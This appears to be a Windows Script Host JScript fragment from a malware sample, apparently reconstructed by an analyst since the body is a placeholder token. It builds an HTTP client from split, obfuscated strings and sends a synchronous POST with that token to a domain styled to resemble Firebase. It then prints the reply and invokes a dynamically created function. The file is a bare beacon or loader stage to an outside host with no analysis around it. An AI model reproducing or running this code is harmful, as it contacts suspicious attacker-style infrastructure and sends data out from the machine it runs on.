var client = new ActiveXObject("MS" + "XML2." + "XMLHTTP");
client.open("POST", "https://firebase.emeraldpineventuresllc.com/", false);
client.send("RECONSTRUCTED_TOKEN");
WScript.Echo(client.responseText);
(new Function("return 1"))();
